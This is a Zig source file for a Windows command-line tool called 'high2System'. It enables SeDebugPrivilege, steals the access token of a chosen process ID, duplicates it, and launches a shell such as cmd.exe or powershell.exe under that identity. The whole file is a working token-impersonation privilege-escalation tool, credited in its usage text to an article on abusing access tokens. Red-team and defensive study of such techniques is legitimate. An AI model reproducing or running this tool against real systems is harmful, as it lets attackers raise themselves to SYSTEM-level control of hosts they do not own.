// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

const std = @import("std");
const win32 = @import("win32").everything;

const windows = std.os.windows;

// https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170

// This exists until zigwin32 is updated to enable bitmasks for DesiredAccess /-:
extern "advapi32" fn OpenProcessToken(
    ProcessHandle: ?win32.HANDLE,
    DesiredAccess: u32,
    TokenHandle: ?*?win32.HANDLE,
) callconv(windows.WINAPI) win32.BOOL;

// This exists until zigwin32 is updated to enable bitmasks for DesiredAccess /-:
pub extern "advapi32" fn DuplicateTokenEx(
    hExistingToken: ?win32.HANDLE,
    DesiredAccess: u32,
    lpTokenAttributes: ?*win32.SECURITY_ATTRIBUTES,
    ImpersonationLevel: win32.SECURITY_IMPERSONATION_LEVEL,
    TokenType: win32.TOKEN_TYPE,
    phNewToken: ?*?win32.HANDLE,
) callconv(windows.WINAPI) win32.BOOL;

const Action = struct {
    const Self = @This();

    command: []u8,
    targetPID: u32,
    targetDuplicateProcessToken: ?win32.HANDLE,
    targetProcessToken: ?win32.HANDLE,
    sourceProcessToken: ?win32.HANDLE,
    allocator: std.mem.Allocator,

    pub fn init(allocator: std.mem.Allocator) !Self {
        return Self{
            .command = "",
            .targetPID = 0,
            .targetDuplicateProcessToken = undefined,
            .targetProcessToken = undefined,
            .sourceProcessToken = undefined,
            .allocator = allocator,
        };
    }

    pub fn tryEnablePrivilege(self: *Self) bool {
        var tp: win32.TOKEN_PRIVILEGES = undefined;
        var luid: win32.LUID = undefined;

        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea
        if (0 == win32.LookupPrivilegeValueA(
            null, //                    [in, optional] LPCSTR lpSystemName,
            win32.SE_DEBUG_NAME, //     [in]           LPCSTR lpName,
            &luid, //                   [out]          PLUID  lpLuid
        )) {
            std.log.err("[!] Failed LookupPrivilegeValueA :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return false;
        }

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = win32.SE_PRIVILEGE_ENABLED;

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
        const hProcess: ?win32.HANDLE = win32.GetCurrentProcess();
        defer _ = Action.CloseHandle(hProcess);

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
        if (0 == OpenProcessToken(
            hProcess.?, //                                                [in]  HANDLE  ProcessHandle,
            @intFromEnum(win32.TOKEN_ACCESS_MASK.ADJUST_PRIVILEGES), //   [in]  DWORD   DesiredAccess,
            &self.sourceProcessToken, //                                  [out] PHANDLE TokenHandle
        )) {
            std.log.err("[!] Failed OpenProcessToken :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return false;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
        if (0 == win32.AdjustTokenPrivileges(
            self.sourceProcessToken, //         [in]            HANDLE            TokenHandle,
            windows.FALSE, //                   [in]            BOOL              DisableAllPrivileges,
            &tp, //                             [in, optional]  PTOKEN_PRIVILEGES NewState,
            @sizeOf(win32.TOKEN_PRIVILEGES), // [in]            DWORD             BufferLength,
            null, //                            [out, optional] PTOKEN_PRIVILEGES PreviousState,
            null, //                            [out, optional] PDWORD            ReturnLength
        )) {
            const result = @intFromEnum(win32.GetLastError());
            if (result == @intFromEnum(win32.WIN32_ERROR.ERROR_INVALID_HANDLE)) {
                std.log.err("[!] Failed AdjustTokenPrivileges - invalid handle :: error code ({d})", .{result});
            } else {
                std.log.err("[!] Failed AdjustTokenPrivileges:: error code ({d})", .{result});
            }

            return false;
        }

        const result = @intFromEnum(win32.GetLastError());
        if (result != 0) { // win32.WIN32_ERROR.ERROR_SUCCESS

            if (result == 1300) { // win32.WIN32_ERROR.ERROR_NOT_ALL_ASSIGNED
                std.log.err("[!] Failed to assign privilege :: error code ({d})", .{result});
            } else {
                std.log.err("[!] Failed to enable SeDebugPrivilege :: error code ({d})", .{result});
            }

            return false;
        }

        return true;
    }

    pub fn execute(self: *Self) bool {
        var startupInfo: win32.STARTUPINFOW = std.mem.zeroes(win32.STARTUPINFOW);
        var processInformation: win32.PROCESS_INFORMATION = std.mem.zeroes(win32.PROCESS_INFORMATION);

        startupInfo.cb = @sizeOf(win32.STARTUPINFOW);

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        const processHandle: ?win32.HANDLE = win32.OpenProcess(
            win32.PROCESS_QUERY_LIMITED_INFORMATION, // [in] DWORD dwDesiredAccess,
            windows.TRUE, //                            [in] BOOL  bInheritHandle,
            self.targetPID, //                          [in] DWORD dwProcessId
        );
        defer _ = Action.CloseHandle(processHandle);
        var result = @intFromEnum(win32.GetLastError());

        if (result != 0) {
            std.log.err("[!] Failed OpenProcess :: error code ({d})", .{result});
            return false;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
        _ = OpenProcessToken(
            processHandle, //               [in]  HANDLE  ProcessHandle,
            win32.MAXIMUM_ALLOWED, //       [in]  DWORD   DesiredAccess,
            &self.targetProcessToken, //    [out] PHANDLE TokenHandle
        );
        result = @intFromEnum(win32.GetLastError());

        if (result != 0) {
            std.log.err("[!] Failed OpenProcessToken :: error code ({d})", .{result});
            return false;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
        if (0 == win32.ImpersonateLoggedOnUser(
            self.targetProcessToken, // [in] HANDLE hToken
        )) {
            std.log.err("[!] Failed ImpersonateLoggedOnUser :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return false;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
        if (0 == DuplicateTokenEx(
            self.targetProcessToken, //             [in]           HANDLE                       hExistingToken
            win32.MAXIMUM_ALLOWED, //               [in]           DWORD                        dwDesiredAccess
            null, //                                [in, optional] LPSECURITY_ATTRIBUTES        lpTokenAttributes
            win32.SecurityImpersonation, //         [in]           SECURITY_IMPERSONATION_LEVEL ImpersonationLevel
            win32.TokenPrimary, //                  [in]           TOKEN_TYPE                   TokenType
            &self.targetDuplicateProcessToken, //   [out]          PHANDLE                      phNewToken
        )) {
            std.log.err("[!] Failed DuplicateTokenEx :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return false;
        }

        result = @intFromEnum(win32.GetLastError());

        if (result != 0) {
            std.log.err("[!] Failed DuplicateTokenEx :: error code ({d})", .{result});
            return false;
        }

        const lpApplicationName = std.unicode.utf8ToUtf16LeWithNull(self.allocator, self.command) catch undefined;
        defer self.allocator.free(lpApplicationName);

        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
        if (0 == win32.CreateProcessWithTokenW(
            self.targetDuplicateProcessToken, //[in]                HANDLE                hToken,
            win32.LOGON_WITH_PROFILE, //        [in]                DWORD                 dwLogonFlags,
            lpApplicationName, //               [in, optional]      LPCWSTR               lpApplicationName,
            null, //                            [in, out, optional] LPWSTR                lpCommandLine,
            0, //                               [in]                DWORD                 dwCreationFlags,
            null, //                            [in, optional]      LPVOID                lpEnvironment,
            null, //                            [in, optional]      LPCWSTR               lpCurrentDirectory,
            &startupInfo, //                    [in]                LPSTARTUPINFOW        lpStartupInfo,
            &processInformation, //             [out]               LPPROCESS_INFORMATION lpProcessInformation
        )) {
            std.log.err("[!] Failed CreateProcessWithTokenW :: {s} error code ({d})", .{ self.command, @intFromEnum(win32.GetLastError()) });
            return false;
        }

        result = @intFromEnum(win32.GetLastError());

        if (result != 0) {
            std.log.err("[!] Failed CreateProcessWithTokenW :: error code ({d})", .{result});
            return false;
        }

        return true;
    }

    pub fn debug(self: *Self) void {
        std.log.debug(
            "\nTarget PID:\t{d}\nCommand:\t{s}\n",
            .{ self.targetPID, self.command },
        );
    }

    pub fn parsePID(self: *Self, line: []u8) !void {
        self.targetPID = std.fmt.parseInt(u32, line, 10) catch undefined;
    }

    pub fn parseCommand(self: *Self, line: []u8) !void {
        self.command = std.fmt.allocPrintZ(self.allocator, "{s}", .{line}) catch undefined;
    }

    pub fn deinit(self: *Self) void {
        self.allocator.free(self.command);

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself
        _ = win32.RevertToSelf();

        Action.CloseHandle(self.targetDuplicateProcessToken);
        Action.CloseHandle(self.targetProcessToken);
        Action.CloseHandle(self.sourceProcessToken);
    }

    pub fn CloseHandle(handle: ?win32.HANDLE) void {
        if (handle != null and handle.? != win32.INVALID_HANDLE_VALUE) {
            // https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
            _ = win32.CloseHandle(handle.?);
        }
    }
};

pub fn usage(argv: []u8) !void {
    const stdout = std.io.getStdOut().writer();

    try stdout.print(
        \\high2System
        \\
        \\  This tool exist thanks to https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962
        \\
        \\Requirements:
        \\  * SE_IMPERSONATE_NAME - "The process that calls CreateProcessWithTokenW must have this privilege."
        \\  * SE_DEBUG_PRIVILEGE
        \\
        \\Usage:
        \\   <PID> <lpApplicationName>
        \\
        \\Example:
        \\ .\\{s} 123 C:\windows\system32\cmd.exe
        \\ .\\{s} 123 C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
    , .{ argv, argv });

    std.os.exit(0);
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    // Parse args into string array (error union needs 'try')
    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len != 3) {
        try usage(args[0]);
    }

    var action = try Action.init(allocator);
    defer action.deinit();

    var i: u8 = 0;

    for (args) |arg| {
        if (i == 1) {
            try action.parsePID(arg);
        }

        if (i == 2) {
            try action.parseCommand(arg);
        }

        i += 1;
    }

    std.log.info("[+] lpApplicationName exists!", .{});

    action.debug();

    if (!action.tryEnablePrivilege()) {
        std.log.err("[!] User does not possess SeDebugPrivilege", .{});
        return;
    }

    std.log.info("[+] Privileges Verified and Enabled", .{});

    if (!action.execute()) {
        std.log.err("[!] Failed to execute {s}", .{action.command});
        return;
    }

    std.log.info("[+] Executed {s}", .{action.command});

    std.os.exit(0);
}
